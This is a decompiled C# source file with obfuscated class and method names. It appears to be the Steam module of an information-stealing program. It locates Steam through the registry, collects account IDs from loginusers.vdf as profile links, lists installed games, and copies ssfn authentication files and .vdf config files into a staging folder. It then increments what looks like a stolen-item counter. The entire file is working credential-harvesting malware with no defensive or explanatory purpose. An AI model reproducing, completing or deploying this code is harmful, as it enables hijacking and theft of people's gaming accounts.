using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using Microsoft.Win32;

internal class Class44
{
	private static readonly string string_0 = "SOFTWARE\\Wow6432Node\\Valve\\Steam";

	public static readonly string string_1 = "Software\\Valve\\Steam";

	private static readonly bool bool_0 = true;

	private static readonly bool bool_1 = false;

	private static readonly string string_2 = Path.Combine(smethod_1(), "config\\loginusers.vdf");

	public static void smethod_0()
	{
		try
		{
			string text = Class38.string_11 + "\\Steam";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(string_1);
			string text2 = registryKey.GetValue("SteamPath")!.ToString();
			if (!Directory.Exists(text2) || smethod_1() == null || smethod_2() == null)
			{
				return;
			}
			Directory.CreateDirectory(text);
			foreach (string item in smethod_2())
			{
				File.AppendAllText(text + "\\AccountsList.txt", item);
			}
			string[] subKeyNames = registryKey.OpenSubKey("Apps")!.GetSubKeyNames();
			foreach (string text3 in subKeyNames)
			{
				using RegistryKey registryKey2 = registryKey.OpenSubKey("Apps\\" + text3);
				string text4 = (string)registryKey2.GetValue("Name");
				text4 = (string.IsNullOrEmpty(text4) ? "Unknown" : text4);
				File.AppendAllText(text + "\\Games.txt", text4 + "\n");
			}
			if (Directory.Exists(text2))
			{
				Directory.CreateDirectory(text + "\\ssnf");
				subKeyNames = Directory.GetFiles(text2);
				foreach (string text5 in subKeyNames)
				{
					if (text5.Contains("ssfn"))
					{
						File.Copy(text5, text + "\\ssnf\\" + Path.GetFileName(text5));
					}
				}
			}
			string path = Path.Combine(text2, "config");
			if (Directory.Exists(path))
			{
				Directory.CreateDirectory(text + "\\configs");
				subKeyNames = Directory.GetFiles(path);
				foreach (string text6 in subKeyNames)
				{
					if (text6.EndsWith("vdf"))
					{
						File.Copy(text6, text + "\\configs\\" + Path.GetFileName(text6));
					}
				}
			}
			Class36.int_16++;
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}

	public static string smethod_1(string string_3 = "InstallPath", string string_4 = "SourceModInstallPath")
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
			using RegistryKey registryKey2 = registryKey.OpenSubKey(string_0, Environment.Is64BitOperatingSystem ? bool_0 : bool_1);
			using RegistryKey registryKey3 = registryKey.OpenSubKey(string_1, Environment.Is64BitOperatingSystem ? bool_0 : bool_1);
			object obj;
			if (registryKey2 == null)
			{
				obj = null;
			}
			else
			{
				object? value = registryKey2.GetValue(string_3);
				if (value == null)
				{
					obj = null;
				}
				else
				{
					obj = value!.ToString();
					if (obj != null)
					{
						goto IL_0092;
					}
				}
			}
			obj = registryKey3?.GetValue(string_4)?.ToString();
			goto IL_0092;
			IL_0092:
			return (string)obj;
		}
		catch (Exception value2)
		{
			Console.WriteLine(value2);
			return null;
		}
	}

	public static List<string> smethod_2()
	{
		try
		{
			if (!File.Exists(string_2))
			{
				return null;
			}
			List<string> list = (from Match x in Regex.Matches(File.ReadAllText(string_2), "\\\"76(.*?)\\\"")
				select "76" + x.Groups[1].Value).ToList();
			List<string> list2 = new List<string>();
			for (int i = 0; i < list.Count(); i++)
			{
				list2.Add("https://steamcommunity.com/profiles/" + list[i] + "\n");
			}
			return list2;
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			return null;
		}
	}
}
